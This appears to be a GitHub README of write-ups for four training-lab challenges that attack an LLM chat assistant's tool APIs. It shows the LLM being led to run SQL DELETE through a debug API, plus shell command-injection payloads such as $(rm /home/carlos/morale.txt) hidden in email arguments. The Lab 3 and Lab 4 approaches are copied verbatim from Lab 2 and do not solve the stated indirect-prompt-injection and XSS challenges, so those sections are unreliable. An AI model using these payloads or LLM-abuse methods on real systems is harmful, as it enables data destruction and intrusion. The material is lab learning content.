# LLM-Security-Labs

## Lab 1: Exploiting LLM APIs with excessive agency

### Challenge
To solve the lab, use the LLM to delete the user `carlos`.

### My Approach
- To visit the `LiveChat` Web page.
- According to the challenge description and LLM's nature, they are exposed to some APIs.
- I use prompt engineering to gather details regarding the same and ask about APIs and their respective arguments `Debug_SQL_API` and `SQLcommand string`.
- Now, I call the `Debug_SQL_API` with the the SQL Comand `SELECT * FROM USERS` which returns the respective information regarding the user like name, password, etc.
- Sweet, I query the same API but with a different args `DELETE FROM users WHERE username='carlos'` which forces the LLM to access the API, run my SQL query and delete the respective user.

**CHALLENGE SOLVED**
![LLMSec1](https://github.com/user-attachments/assets/38cca6c6-2787-4693-80be-ca9b472338df)

## Lab 2: Exploiting vulnerabilities in LLM APIs

### Challenge
This lab contains an OS command injection vulnerability that can be exploited via its APIs. You can call these APIs via the LLM. To solve the lab, delete the `morale.txt` file from Carlos's home directory.

### My Approach
- To visit the `LiveChat` Web page.
- According to the challenge description and LLM's nature, they are exposed to some APIs which can lead to command injection vulnerabilities.
- I use prompt engineering to gather details regarding the same and ask about APIs and their respective arguments like `product_info`, `password_reset`, `subscribe_to_newsletter (args - emailaddress)`.
- I did call the `subscribe_to_newsletter` with arg `attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` to recieve an email on **EMAIL CLIENT** web page.
- We can use the email address for RCE `$(command to execute)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
- Now, time to test and play with the LLM and gather infromation `$(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` hich returned `carlos` as the output for the command.
- Similarly, for `$(pwd)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` and `$(ls)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` which returns `/home/carlos` and `morale.txt`, respectively.
- Now is the time to delete the file and solve the challenge by `$(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
  
**CHALLENGE SOLVED**
![LLMSec2](https://github.com/user-attachments/assets/e55a6f59-385a-460f-9164-aa87b86a095f)

## Lab 3: Indirect prompt injection

### Challenge
This lab is vulnerable to indirect prompt injection. The user `carlos` frequently uses the live chat to ask about the Lightweight "l33t" Leather Jacket product. To solve the lab, delete `carlos`.

### My Approach
- To visit the `LiveChat` Web page.
- According to the challenge description and LLM's nature, they are exposed to some APIs also succeptible to prompt injection.
- I use prompt engineering to gather details regarding the same and ask about APIs and their respective arguments like `product_info`, `password_reset`, `subscribe_to_newsletter (args - emailaddress)`.
- I did call the `subscribe_to_newsletter` with arg `attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` to recieve an email on **EMAIL CLIENT** web page.
- We can use the email address for RCE `$(command to execute)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
- Now, time to test and play with the LLM and gather infromation `$(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` hich returned `carlos` as the output for the command.
- Similarly, for `$(pwd)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` and `$(ls)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` which returns `/home/carlos` and `morale.txt`, respectively.
- Now is the time to delete the file and solve the challenge by `$(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
  
**CHALLENGE SOLVED**

![LLMSec3](https://github.com/user-attachments/assets/cc359355-d86d-45a0-a2c5-7ef628679f5d)
![LLMSec4](https://github.com/user-attachments/assets/2905e17c-acec-44f6-a66c-1f643e969116)
![Screenshot 2025-05-13 120351](https://github.com/user-attachments/assets/e1f59161-b9ad-47ae-8ec9-a3a934462391)
![Screenshot 2025-05-13 120339](https://github.com/user-attachments/assets/e0553a18-5362-4a8a-a050-89e3cdff2aa8)
![Screenshot 2025-05-13 120332](https://github.com/user-attachments/assets/03c5434a-e63a-4b19-a5a7-e6e4441249e5)
![Screenshot 2025-05-13 120312](https://github.com/user-attachments/assets/39e08677-ec85-480b-b9a5-520d9b1a9406)
![Screenshot 2025-05-13 120017](https://github.com/user-attachments/assets/66c891b2-bd70-4200-82e1-e0f8f4d6174d)
![Screenshot 2025-05-13 115724](https://github.com/user-attachments/assets/8e368249-2de8-4be1-ae49-c0795b4a0cf6)
![Screenshot 2025-05-13 115346](https://github.com/user-attachments/assets/e4f49b72-b676-44b7-b977-dc1645937e65)
![Screenshot 2025-05-13 115312](https://github.com/user-attachments/assets/1e3d4670-30f9-48a2-8200-287ddc348098)
![Screenshot 2025-05-13 114833](https://github.com/user-attachments/assets/871ae36d-b801-4ace-9278-cc9d37868178)
![Screenshot 2025-05-13 114816](https://github.com/user-attachments/assets/9100c85d-6ae1-4683-80cd-7887bf4de4a5)
![Screenshot 2025-05-13 114646](https://github.com/user-attachments/assets/046fd1fb-22fb-424b-8963-f408fdc4f23c)
![Screenshot 2025-05-13 114527](https://github.com/user-attachments/assets/21c61c25-7044-46bc-838d-ccc8fb2b6367)
![Screenshot 2025-05-13 114506](https://github.com/user-attachments/assets/3fba7d49-8439-44c3-8c90-08765cb516bb)
![Screenshot 2025-05-13 110312](https://github.com/user-attachments/assets/833e6e03-3521-412d-8476-078cf6e17a7e)
![Screenshot 2025-05-13 110252](https://github.com/user-attachments/assets/2e78c339-a58e-497f-be64-a71f8100bad4)
![Screenshot 2025-05-13 105001](https://github.com/user-attachments/assets/8e6d85d8-4c84-4246-926e-84964c9aa471)
![Screenshot 2025-05-13 104157](https://github.com/user-attachments/assets/1d11635c-b66b-483b-9294-49fe25618ef6)
![Screenshot 2025-05-13 103809](https://github.com/user-attachments/assets/5948050a-403b-4941-9ef0-1afe3f051094)
![Screenshot 2025-05-13 103529](https://github.com/user-attachments/assets/52e8b160-eb63-4d1c-a6ae-b61e97e7a8a1)
![Screenshot 2025-05-13 102453](https://github.com/user-attachments/assets/a1d6532e-fe63-4b0c-8d06-b6acb07cdf33)

## Lab 4: Exploiting insecure output handling in LLMs

### Challenge
This lab handles LLM output insecurely, leaving it vulnerable to XSS. The user carlos frequently uses the live chat to ask about the **Lightweight "l33t" Leather Jacket** product. To solve the lab, use indirect prompt injection to perform an XSS attack that deletes `carlos`.

### My Approach
- To visit the `LiveChat` Web page.
- According to the challenge description and LLM's nature, they are exposed to some APIs which can lead to command injection vulnerabilities.
- I use prompt engineering to gather details regarding the same and ask about APIs and their respective arguments like `product_info`, `password_reset`, `subscribe_to_newsletter (args - emailaddress)`.
- I did call the `subscribe_to_newsletter` with arg `attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` to recieve an email on **EMAIL CLIENT** web page.
- We can use the email address for RCE `$(command to execute)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
- Now, time to test and play with the LLM and gather infromation `$(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` hich returned `carlos` as the output for the command.
- Similarly, for `$(pwd)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` and `$(ls)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` which returns `/home/carlos` and `morale.txt`, respectively.
- Now is the time to delete the file and solve the challenge by `$(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
  
**CHALLENGE SOLVED**


